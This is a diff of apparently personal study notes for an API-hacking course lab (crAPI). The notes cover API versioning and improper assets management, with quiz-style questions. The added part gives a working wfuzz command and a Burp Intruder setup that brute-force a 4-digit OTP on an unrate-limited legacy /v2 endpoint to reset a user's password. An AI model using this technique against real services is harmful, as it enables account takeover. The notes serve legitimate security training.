@@ -1,16 +1,70 @@
 
 # Improper Assets Management vulnerability primarily involves what?
-      -Exposed and unsupported API versions
-    
-#  Which of the following are methods used for API versioning?
-      -Request parameters
-      -Request Headers
-      -URL path
+
+	we can start fuzzing requests across the entire API of other versions.
+		it always a good idea to test from both authenticated or unauthenticated perspectives.
+
+
+	#Which of the following are methods used for API versioning?
+     
+	 +Request parameters
+			{
+				"ver": 1.0,
+				"user":"hapiHacker"
+			}
+	  
+      +Request Headers
+			Accept: version=2.0
+			Accept api-version=3
+	  
+      +URL path
+			api.target.com/v3
+			/api/v2/accounts/
+
 
 # Which security controls would have helped reduce the risk of the crAPI Improper Assets Management vulnerability?
+     
       -Implementing rate limiting
       -Developers keep an updated inventory of the API
       -Developers decommissioning old versions of the API
       -Developers reducing MFA attempts across all versions
 
-
+		
+		To get better results from postman collection runner, we will configure a TEST using collection editor. 
+			run Unauthenticated baseline scan, make sure Save Responses
+			
+			review the results from unauthenticated baseline scan to have idea of how API provider responds to request using supported versioning.
+			
+		Add a variable named "ver" to postman enviroment and set initial value to "v1", also update it to v2, v3
+		
+		
+		we will have to work with ANOMALY STATUS CODE respone in different versions. 
+		
+		http://crapi.apisec.ai/identity/api/auth/v2/check-otp
+				
+					v1- 404 
+					v2- 200 but got 500
+ 					v3- 200 but got 500
+					
+	
+		Investigating the passwords reset request will show HTTP 500 error /v3 path becasue the application has 
+			a control that limits the number of times we attempt to send otp.
+			
+			
+			sending same request to /v2 also results in HTTP 500 error. but reponse is slightly different.
+				send request to burp comperaer 
+					
+					v2 - invalid OTP. please try again, status:500    - does not rate-limit
+					v3 - Error, status: 500
+					
+		we can perform the attack Brup Intruder-> payload type: Brute Force, character-set: 0123456789, min or max-length: 4
+		
+			wfuzz -d '{"email":"hapihacker@gmail.com", "otp":"FUZZ", "password":"NewPassword01"}'
+				-H 'Content-Type: application/json' -z file,/usr/share/wordlists/Seclists-master/Fuzzing/4-digits-0000-9999.txt 
+					-u http://crapi.apisec.ai/identity/api/auth/v2/check-otp -hc 500
+					
+                              
+                              
+                              
+                              
+					
